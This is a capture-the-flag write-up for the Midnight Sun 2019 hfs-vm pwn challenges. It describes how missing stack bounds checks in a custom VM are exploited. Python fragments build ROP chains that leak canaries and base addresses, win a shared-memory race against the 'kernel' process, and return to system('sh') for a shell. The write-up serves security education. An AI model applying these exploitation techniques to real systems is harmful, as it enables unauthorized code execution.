# Writeup for hfs-vm (pwn, 287 pts, 42 solves) and hfs-vm2 (pwn, 660 pts, 14 solves), Midnight Sun CTF 2019 Quals

hfs-vm:

> Write a program in my crappy VM language.
>
> Service: nc hfs-vm-01.play.midnightsunctf.se 4096
>
> Download: [hfs-vm.tar.gz](https://s3.eu-north-1.amazonaws.com/dl.2019.midnightsunctf.se/529C928A6B855DC07AEEE66037E5452E255684E06230BB7C06690DA3D6279E4C/hfs-vm.tar.gz)

hfs-vm2:

> Escape the VM to get a flag.
>
> Service: nc hfs-vm-01.play.midnightsunctf.se 4096
>
> Download: [hfs-vm.tar.gz](https://s3.eu-north-1.amazonaws.com/dl.2019.midnightsunctf.se/529C928A6B855DC07AEEE66037E5452E255684E06230BB7C06690DA3D6279E4C/hfs-vm.tar.gz)

## Analysis

The provided service implements a VM for a custom architecture as well as a 'kernel' which the VM process uses to interact with the system.

### userspace and kernel

The userspace and the kernel are implemented using two processes; the binary forks on startup and the parent becomes the kernel while the child executes the userspace.
They communicate via both a socket pair and a shared memory region.

The kernel process initially resets its stack canary, to get a canary different from that in the userspace process.

The userspace process reads bytecode from the user and implements a simple VM to 'execute' the bytecode. Additionally, it enables the strict seccomp mode, which only allows the `read`, `write` and `exit` system calls.

'system calls' between the userspace process and the kernel process are implemented using the socket pair and shared memory mentioned above. To enter a system call, the userspace process sends the system call number and arguments over the socket, and reads the return value from the socket. The kernel process on the other hand reads from the socket, then executes the system call, and writes the return value back to the socket. This way, one of the two processes is always blocked reading. Large arguments or return values are passed via the shared memory region: the first two bytes of the region contain the size of the data, followed by the raw data.

### Custom VM

As already mentioned above, the userspace process implements a simple VM for a custom architecture. The virtual 16-bit CPU has 16 registers, numbered 0 through 15, with register 14 and 15 doubling as the stack and instruction pointer. The stack has a fixed size of 32 words. Internally, the state of the VM is stored in the following struct on the stack of the userspace process:

```c
struct state_t {
  int fd;
  int pad;
  void *shared_mem;
  uint16_t regs[14];
  uint16_t reg_sp;
  uint16_t reg_pc;
  uint16_t stack[32];
};
```

The custom architecture executes bytecode with 4 byte long instructions encoding the instruction type and up to two operands. The following instructions are supported:

- `mov reg, imm`, `add reg, imm`, `sub reg, imm`, `xor reg, imm`: move/add/subtract/xor the register `reg` with the 16-bit immediate value `imm` and store the result in `reg`

- `mov reg, reg`, `add reg, reg`, `sub reg, reg`, `xor reg, reg`: move/add/subtract/xor the first register with the second register and store the result in the second register

- `xchg reg, reg`: swap the contents of the two registers

- `push reg`, `push imm`: push the register / immediate value onto the stack

- `pop reg`: pop a value off the stack and store it in `reg`

- `setstack reg, imm`, `setstack reg, reg`: use the value of the register `reg` as an (absolute) index into the stack; set the stack value at that index to `reg`/`imm`

- `getstack reg, reg`: use the value of the first register as an (absolute) index into the stack; store the stack value at that index in the second register

- `syscall`: trigger a system call; the first three registers are passed to the kernel as the syscall number and two arguments

- `debug`: output the values of all registers and the stack

The `syscall` instruction additionally passes the VM's stack to the kernel via the shared memory region. When looking at the implementation of these instructions, we notice that `push` and `pop` perform bounds checks on the stack, while `setstack` and `getstack` don't!

## The First Flag

At this point we can already obtain the first flag by issuing syscall 3, which copies the flag onto the VM's stack, and then executing the `debug` instruction.

Flag: `midnight{m3_h4bl0_vm}`

## Exploitation

Because of the strict seccomp mode used by the userspace process, we cannot spawn a shell from that process. We have to use the bug discovered above to gain control of the userspace process, afterwards use another bug in the kernel to escalate further and then spawn a shell.

### ROP in the userspace

Using the missing bounds checks mentioned above, we can first leak both the stack canary (of the userspace process) and the base address of the binary (which will be the same in the userspace and kernel processes).
After that, we overwrite the stack of the userspace process and execute a ROP chain. Because our previously sent bytecode has to write this chain, we are limited in size. Thus, the first ROP chain will just read some input (the second ROP chain) onto the data segment of the process and pivot the stack there.

```python
# gadgets encoded as tuples
# the first element is the gadget/address
# the second element indicates if the address is relative to the binary's base

# read(0, data + 0xa00, 0xe00)
(pop_rdi, True),
(0, False),
(pop_rsi, True),
(0x203000 + 0xa00, True),
(pop_rdx, True),
(0xe00, False),
(binary.plt.read, True),
# rsp = data + 0xa00
(pop_rsp, True),
(0x203000 + 0xa00, True),
```

We have to write this first ROP chain using the bytecode executed in the VM, using the `getstack` and `setstack` instructions as explained above. Because we have no way to leak the base address of the binary before sending the bytecode, we have to use the bytecode to adjust the addresses of our gadgets.

```python
# generate the bytecode for a given ROP chain
# abbreviations for opcode operands: r = register, s = stack, i = immediate

bc = ''
# set regs 1, 2, 3, 4 to ret addr (4 is not touched, because always zero)
bc += mov_rs(1, 52)
bc += mov_rs(2, 53)
bc += mov_rs(3, 54)
# adjust regs to base addr (subtract offset of return address)
bc += sub_ri(1, 0xe6e)
# debug to leak base addr
bc += p32(0xa)

idx = 52
for val, rel in rop:
    if rel:
        # set regs 5, 6, 7, 8 to val
        bc += mov_ri(5, val & 0xffff)
        bc += mov_ri(6, (val >> 16) & 0xffff)
        bc += mov_ri(7, (val >> 32) & 0xffff)
        bc += mov_ri(8, (val >> 48) & 0xffff)
        # add base addr
        bc += add_rr(5, 1)
        bc += add_rr(6, 2)
        bc += add_rr(7, 3)
        # write to stack
        bc += mov_sr(idx, 5)
        bc += mov_sr(idx + 1, 6)
        bc += mov_sr(idx + 2, 7)
        bc += mov_sr(idx + 3, 8)
    else:
        # write to stack
        bc += mov_si(idx, val & 0xffff)
        bc += mov_si(idx + 1, (val >> 16) & 0xffff)
        bc += mov_si(idx + 2, (val >> 32) & 0xffff)
        bc += mov_si(idx + 3, (val >> 48) & 0xffff)
    idx += 4
```

For exploiting the kernel, we will need access to the shared memory region, so we use the second ROP chain to leak its address and read a third ROP chain.

```python
# second rop chain to leak shared_mem pointer
rop = ROP(binary)
rop.write(1, binary.address + off_shared_mem, 8)
rop.read(0, binary.address + off_second_chain, 0x500)
rop.raw(binary.address + pop_rsp)
rop.raw(binary.address + off_second_chain)
```

### ROP in the kernel

Now that we have all info we need and the ability to execute an arbitrarily long ROP chain, we can search for a bug in the kernel.

The first bug is obvious when looking at the syscall handler: the shared memory region (which also contains its own size and is fully controlled by userspace) is copied in a fixed-size buffer on the stack, leading to a simple stack buffer overflow. However, there is a stack canary preventing us from exploiting this bug alone.

The second bug is a synchronization issue: right before the kernel returns from a syscall, the stack buffer is copied back into the shared memory region, using the size specified in the shared memory region. That means, if we manage to increase the size while the kernel performs a syscall, we can leak data from the kernel stack! During normal operation one of the two processes always blocks while reading from the socket, but now that we control the userspace, we can trigger a syscall and continue execution in userspace without waiting for the syscall to finish.

At first this sounds like a hard race condition we have to win, until we look at syscall number 4 which, when supplied with a specific argument, sleeps for a total of 4 seconds. That's more than enough time to increase the size of the shared memory region. The last issue we have is that, to get the correct timing, the userspace process needs to wait too, but `sleep` (actually `nanosleep`) is blocked by the seccomp filter. We can still let the userspace process wait by issuing a dummy read from stdin and waiting the correct amount in our exploit script.

So here's the plan for the third ROP chain: we trigger syscall number 4 and wait a second for the kernel to enter the syscall. Then we overwrite the size of the shared memory region and wait for the kernel to return from the syscall. Now the kernel's stack canary is stored in the shared memory region, so we print the kernel's canary to stdout. Our exploit script uses that canary and the info we acquired previously to craft a ROP chain for the kernel. The ROP chain in the userspace continues and reads the ROP chain for the kernel from stdin, into the shared memory region. Finally, it triggers any syscall. The kernel now copies the shared memory region onto its stack, smashing it in the process.

```python
# third rop chain to trigger ROP in kernel
rop = ROP(binary)
rop_data = ''
rop_data_addr = binary.address + off_second_chain + 0x200

def data_sys(num, arg1=0, arg2=0):
    return p8(num) + p16(arg1) + p16(arg2)

# trigger sys_random(4)
rop.write(parent_fd, rop_data_addr, 5)
rop_data += data_sys(4, 4)
# overwrite shared_mem size
rop.read(0, shared_mem, 2)
# dummy read, just for waiting a bit
rop.read(0, shared_mem, 2)
# leak parent stack canary
rop.write(1, shared_mem + 74, 8)
# read rop chain for parent to shared_mem
rop.read(0, shared_mem, 0x1000)
# trigger rop in parent, via sys_ls()
rop.write(parent_fd, rop_data_addr + len(rop_data), 5)
rop_data += data_sys(6)
# exit
rop.exit(0)
```

The ROP chain executed in the kernel is very simple: since the binary imports `system`, we can return to it, passing `sh` as argument (which we can also place in the shared memory), and finally get a shell!

```python
rop = ROP(binary)
# 'sh' is placed at shared_mem + 0x300
rop.system(shared_mem + 0x300)
```

Flag: `midnight{7h3re5_n0_I_iN_VM_bu7_iF_th3r3_w@s_1t_w0uld_b3_VIM}`

You can find the full exploit script [here](https://gist.github.com/LevitatingLion/725dd8bfa710d95b108fa83f67449132).
